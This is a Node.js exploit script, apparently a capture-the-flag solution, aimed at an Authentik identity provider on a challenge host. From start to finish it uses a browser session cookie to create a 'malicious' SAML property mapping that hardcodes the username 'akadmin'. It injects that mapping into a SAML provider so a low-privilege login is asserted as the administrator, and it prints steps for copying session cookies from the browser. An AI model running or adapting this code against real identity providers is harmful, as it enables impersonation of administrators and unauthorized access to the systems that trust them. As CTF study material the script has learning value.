#!/usr/bin/env node
/**
 * Authentik API Helper
 * Automates property mapping creation and SAML provider manipulation
 * 
 * Usage:
 *   node authentik_api.js --session <session_cookie> --target <base_url>
 */

const https = require('https');
const http = require('http');
const { URL } = require('url');

class AuthentikAPI {
  constructor(baseUrl, sessionCookie, csrfToken = null) {
    this.baseUrl = baseUrl.replace(/\/$/, '');
    this.sessionCookie = sessionCookie;
    this.csrfToken = csrfToken;
  }

  async request(method, path, data = null) {
    const url = new URL(this.baseUrl + path);
    const isHttps = url.protocol === 'https:';
    const client = isHttps ? https : http;

    return new Promise((resolve, reject) => {
      const options = {
        hostname: url.hostname,
        port: url.port || (isHttps ? 443 : 80),
        path: url.pathname + url.search,
        method: method,
        headers: {
          'Cookie': this.sessionCookie,
          'Accept': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      };

      if (this.csrfToken) {
        options.headers['X-CSRFToken'] = this.csrfToken;
      }

      if (data) {
        const jsonData = JSON.stringify(data);
        options.headers['Content-Type'] = 'application/json';
        options.headers['Content-Length'] = Buffer.byteLength(jsonData);
      }

      const req = client.request(options, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          // Extract CSRF token from Set-Cookie if available
          const setCookie = res.headers['set-cookie'];
          if (setCookie) {
            const csrfMatch = setCookie.find(c => c.startsWith('csrftoken='));
            if (csrfMatch) {
              this.csrfToken = csrfMatch.split(';')[0].split('=')[1];
            }
          }

          if (res.statusCode >= 200 && res.statusCode < 300) {
            try {
              resolve(JSON.parse(body || '{}'));
            } catch {
              resolve({ raw: body });
            }
          } else {
            reject(new Error(`HTTP ${res.statusCode}: ${body}`));
          }
        });
      });

      req.on('error', reject);

      if (data) {
        req.write(JSON.stringify(data));
      }

      req.end();
    });
  }

  async listPropertyMappings() {
    console.log('[+] Fetching SAML property mappings...');
    return await this.request('GET', '/api/v3/propertymappings/saml/');
  }

  async createMaliciousMapping(username = 'akadmin') {
    console.log(`[+] Creating malicious property mapping (username="${username}")...`);
    
    const mapping = {
      name: `evil-username-${Date.now()}`,
      saml_name: 'http://schemas.goauthentik.io/2021/02/saml/username',
      expression: `return "${username}"`,
      friendly_name: null
    };

    return await this.request('POST', '/api/v3/propertymappings/saml/', mapping);
  }

  async listProviders(search = 'flaggetter') {
    console.log(`[+] Fetching SAML providers (search="${search}")...`);
    return await this.request('GET', `/api/v3/providers/saml/?search=${search}`);
  }

  async getProvider(providerId) {
    console.log(`[+] Fetching provider ${providerId}...`);
    return await this.request('GET', `/api/v3/providers/saml/${providerId}/`);
  }

  async updateProviderMappings(providerId, mappingIds) {
    console.log(`[+] Updating provider ${providerId} with mappings: ${mappingIds}...`);
    
    const update = {
      property_mappings: mappingIds
    };

    return await this.request('PATCH', `/api/v3/providers/saml/${providerId}/`, update);
  }

  async getCurrentUser() {
    console.log('[+] Fetching current user info...');
    return await this.request('GET', '/api/v3/core/users/me/');
  }

  async listUsers() {
    console.log('[+] Fetching user list...');
    return await this.request('GET', '/api/v3/core/users/');
  }
}

// Helper function to extract session cookie from browser
function printCookieInstructions() {
  console.log('\n📋 How to get your session cookie:');
  console.log('   1. Login to Authentik in your browser');
  console.log('   2. Open Developer Tools (F12)');
  console.log('   3. Go to Application/Storage → Cookies');
  console.log('   4. Copy the entire Cookie header value, or at minimum:');
  console.log('      - authentik_session=...');
  console.log('      - csrftoken=... (if present)');
  console.log('   5. Pass it as: --session "authentik_session=xxx; csrftoken=yyy"\n');
}

async function runExploit(baseUrl, sessionCookie) {
  const api = new AuthentikAPI(baseUrl, sessionCookie);

  try {
    // Step 1: Verify API access
    console.log('\n🔍 Step 1: Verifying API access...');
    const user = await api.getCurrentUser();
    console.log(`✓ Logged in as: ${user.username} (${user.name})`);
    console.log(`  User ID: ${user.pk}`);
    console.log(`  Is Staff: ${user.is_staff}`);
    console.log(`  Is Superuser: ${user.is_superuser}`);

    if (!user.is_staff && !user.is_superuser) {
      console.log('\n⚠️  Warning: Not a staff/superuser account');
      console.log('   Attempting anyway (misconfigurations may allow)...\n');
    }

    // Step 2: List existing mappings
    console.log('\n🔍 Step 2: Checking existing property mappings...');
    const mappings = await api.listPropertyMappings();
    console.log(`✓ Found ${mappings.results?.length || 0} SAML property mappings`);
    
    if (mappings.results) {
      mappings.results.forEach(m => {
        console.log(`  - ${m.name} (${m.saml_name})`);
        if (m.saml_name.includes('username')) {
          console.log(`    ⭐ Username mapping: ${m.expression}`);
        }
      });
    }

    // Step 3: Create malicious mapping
    console.log('\n🎯 Step 3: Creating malicious mapping...');
    const evilMapping = await api.createMaliciousMapping('akadmin');
    console.log(`✓ Created mapping ID: ${evilMapping.pk}`);

    // Step 4: Find flaggetter provider
    console.log('\n🔍 Step 4: Finding flaggetter SAML provider...');
    const providers = await api.listProviders('flaggetter');
    
    if (!providers.results || providers.results.length === 0) {
      console.log('❌ No flaggetter provider found!');
      console.log('   Try searching manually or create a new provider.');
      return;
    }

    const provider = providers.results[0];
    console.log(`✓ Found provider: ${provider.name} (ID: ${provider.pk})`);

    // Step 5: Get current mappings
    console.log('\n🔍 Step 5: Getting current provider configuration...');
    const fullProvider = await api.getProvider(provider.pk);
    const currentMappings = fullProvider.property_mappings || [];
    console.log(`  Current mappings: ${currentMappings.join(', ')}`);

    // Step 6: Update provider with evil mapping
    console.log('\n🎯 Step 6: Injecting malicious mapping...');
    const newMappings = [evilMapping.pk, ...currentMappings];
    await api.updateProviderMappings(provider.pk, newMappings);
    console.log('✓ Provider updated successfully!');

    // Success message
    console.log('\n✅ EXPLOIT COMPLETE!');
    console.log('\n📝 Next steps:');
    console.log('   1. Visit: https://saml-web.challs.infobahnc.tf/flag');
    console.log('   2. You will be redirected to IdP for authentication');
    console.log('   3. Login with your credentials (sahas/123)');
    console.log('   4. SAML response will now contain username="akadmin"');
    console.log('   5. Flag should be displayed!');
    console.log('\n   If it doesn\'t work, the evil mapping might be overridden by others.');
    console.log('   Try removing all other username mappings from the provider.\n');

  } catch (error) {
    console.error(`\n❌ Error: ${error.message}`);
    
    if (error.message.includes('403') || error.message.includes('401')) {
      console.error('\n💡 Possible issues:');
      console.error('   - Session cookie expired or invalid');
      console.error('   - Insufficient permissions (not admin)');
      console.error('   - CSRF token missing/invalid');
    } else if (error.message.includes('404')) {
      console.error('\n💡 Endpoint not found - check Authentik version/API path');
    }
    
    throw error;
  }
}

// CLI interface
if (require.main === module) {
  const args = process.argv.slice(2);

  if (args.includes('--help') || args.includes('-h') || args.length === 0) {
    console.log('\n🔧 Authentik SAML Property Mapping Exploit Tool\n');
    console.log('Usage:');
    console.log('  node authentik_api.js --target <url> --session <cookie>\n');
    console.log('Options:');
    console.log('  --target    Base URL of Authentik instance');
    console.log('  --session   Session cookie from browser\n');
    console.log('Example:');
    console.log('  node authentik_api.js \\');
    console.log('    --target https://saml-web.challs.infobahnc.tf \\');
    console.log('    --session "authentik_session=abc123..."\n');
    
    printCookieInstructions();
    process.exit(0);
  }

  const targetIdx = args.indexOf('--target');
  const sessionIdx = args.indexOf('--session');

  if (targetIdx === -1 || sessionIdx === -1) {
    console.error('❌ Error: Both --target and --session are required\n');
    console.log('Run with --help for usage information');
    process.exit(1);
  }

  const baseUrl = args[targetIdx + 1];
  const sessionCookie = args[sessionIdx + 1];

  runExploit(baseUrl, sessionCookie)
    .then(() => {
      console.log('\n✨ Script completed successfully!');
      process.exit(0);
    })
    .catch(error => {
      console.error('\n💥 Script failed!');
      process.exit(1);
    });
}

module.exports = { AuthentikAPI };
